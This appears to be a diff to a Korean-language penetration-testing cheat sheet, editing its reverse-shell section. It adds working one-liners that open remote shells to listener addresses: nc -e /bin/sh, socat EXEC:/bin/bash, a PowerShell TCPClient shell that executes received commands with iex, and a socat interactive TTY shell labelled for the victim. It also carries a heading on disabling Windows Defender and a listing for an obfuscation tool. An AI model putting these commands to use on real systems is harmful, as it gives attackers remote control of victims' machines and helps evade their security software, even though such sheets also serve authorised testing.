@@ -6,11 +6,17 @@
 
 <br/><br/>
 # 2. Reverse Shell
+```nc -lvnp 8443```<br/>
+
+### 클라이언트 - nc를 사용하여 연결
+```nc -e /bin/sh 10.0.3.4 8443```
+
+### 클라이언트 - socat을 사용하여 연결
+```socat TCP4:10.10.3.4:8443 EXEC:/bin/bash```
 
 ### 클라이언트 - PowerShell을 사용하여 연결
-```nc -lvnp 443```<br/>
 ```
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.1',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.1',8443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
 #### Windows Defender 비활성화(PowerShell 연결 차단될 경우)
@@ -40,7 +46,14 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1
 | `Darkarmour`                      | [소스](https://github.com/bats3c/darkarmour) Darkarmour는 Windows 호스트를 상대로 사용하기 위해 난독화된 바이너리를 생성하고 활용하는 도구입니다.                                                                                 |
 
 ### TTY 쉘 생성
-```python -c 'import pty; pty.spawn("/bin/sh")'```
+```python -c 'import pty; pty.spawn("/bin/bash")'```<br/>
+```
+#Listener:
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+#Victim:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+```
 
 ### 대화형 쉘(python 없는 경우)
 ```/bin/sh -i```<br/>
